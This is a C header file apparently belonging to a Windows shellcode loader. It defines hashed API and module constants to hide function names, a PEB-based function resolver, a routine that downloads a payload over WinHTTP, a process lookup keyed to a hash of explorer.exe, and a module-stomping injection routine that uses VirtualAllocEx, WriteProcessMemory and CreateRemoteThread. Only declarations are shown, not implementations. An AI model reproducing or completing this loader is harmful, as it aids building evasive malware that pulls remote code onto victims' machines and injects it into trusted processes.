#ifndef SHELLCODE_H
#define SHELLCODE_H 

/* local headers */
#include "Native.h"

#undef UNICODE
#include <winhttp.h>
#include <tlhelp32.h>
#include <psapi.h> 

#define WIN32_FUNC( x ) __typeof__( x ) * x 
#define MemCopy         __builtin_memcpy

/* casting */
#define C_PTR( x ) ( ( PVOID )    x )
#define U_PTR( x ) ( ( UINT_PTR ) x )

/* Modules */
#define H_MOD_NTDLL    ( 0x70e61753 )
#define H_MOD_KERNEL32 ( 0xadd31df0 )

/* Functionns */
#define H_API_LOADLIBRARYA             0xb7072fdb
#define H_API_CREATETOOLHELP32SNAPSHOT 0xf37ac035
#define H_API_PROCESS32FIRST           0x43683b31
#define H_API_PROCESS32NEXT            0x8db22608
#define H_API_OPENPROCESS              0x8b21e0b6
#define H_API_VIRTUALALLOCEX           0x5775bd54
#define H_API_VIRTUALPROTECTEX         0x5b6b908a
#define H_API_WRITEPROCESSMEMORY       0xb7930ae8
#define H_API_CREATEREMOTETHREAD       0x252b157d
#define H_API_K32ENUMPROCESSMODULES    0xb5303962
#define H_API_K32GETMODULEBASENAMEA    0xfd519598

#define H_API_WINHTTPOPEN              0x613eace5
#define H_API_WINHTTPCONNECT           0x81e0c81d
#define H_API_WINHTTPOPENREQUEST       0xb06d900e
#define H_API_WINHTTPSENDREQUEST       0x7739d0e6
#define H_API_WINHTTPRECEIVERESPONSE   0xae351ae5
#define H_API_WINHTTPREADDATA          0x75064b89
#define H_API_WINHTTPCLOSEHANDLE       0xa7355f15

#define H_API_RTLALLOCATEHEAP          0x3be94c5a
#define H_API_RTLREALLOCATEHEAP        0xaf740371
#define H_API_RTLFREEHEAP              0x73a9e4d7

/* hashed strings */
#define H_STR_EXPLORER_EXE 0x71aa8326

typedef struct _INSTANCE {
  
  /* api function pointers */
  struct {
    /* ntdll */
    WIN32_FUNC( RtlAllocateHeap );
    WIN32_FUNC( RtlReAllocateHeap );
    WIN32_FUNC( RtlFreeHeap );

    /* kernel32 */
    WIN32_FUNC( LoadLibraryA );
    WIN32_FUNC( CreateToolhelp32Snapshot );
    WIN32_FUNC( Process32First );
    WIN32_FUNC( Process32Next );
    WIN32_FUNC( OpenProcess );
    WIN32_FUNC( VirtualAllocEx );
    WIN32_FUNC( VirtualProtectEx );
    WIN32_FUNC( WriteProcessMemory ); 
    WIN32_FUNC( CreateRemoteThread );
    WIN32_FUNC( EnumProcessModules );
    WIN32_FUNC( GetModuleBaseNameA );

    /* winhttp */
    WIN32_FUNC( WinHttpOpen );
    WIN32_FUNC( WinHttpConnect );
    WIN32_FUNC( WinHttpOpenRequest );
    WIN32_FUNC( WinHttpSendRequest );
    WIN32_FUNC( WinHttpReceiveResponse );
    WIN32_FUNC( WinHttpReadData );
    WIN32_FUNC( WinHttpCloseHandle );
  } Win32;

  /* loaded modules */
  struct {
    PVOID Ntdll;
    PVOID Kernel32;
    PVOID WinHttp;
  } Modules; 

} INSTANCE, *PINSTANCE; 

typedef OBJECT_ATTRIBUTES OBJ_ATTR;

VOID Main(
  VOID
);

PVOID LdrModulePeb(
  _In_ ULONG Hash
);

PVOID LdrFunctionAddr(
  _In_ PVOID Module,
  _In_ ULONG Function
);

ULONG HashString(
    _In_ PVOID String,
    _In_ ULONG Length
);

BOOL HttpGetPayload(
  _In_  PINSTANCE Instance, 
  _In_  LPWSTR    Host,
  _In_  USHORT    Port, 
  _In_  LPWSTR    Path, 
  _Out_ PVOID*    Payload,
  _Out_ PSIZE_T   Size   
);

BOOL ProcessPidByHash(
  _In_ PINSTANCE Instance, 
  _In_ ULONG     Hash,
  _In_ PULONG    Pid
);

VOID ModStompInject(
  _In_ PINSTANCE Instance,
  _In_ ULONG     Pid, 
  _In_ LPSTR     Dll, 
  _In_ ULONG     DllSize, 
  _In_ PVOID     Payload, 
  _In_ SIZE_T    Size
); 

#endif // SHELLCODE_H
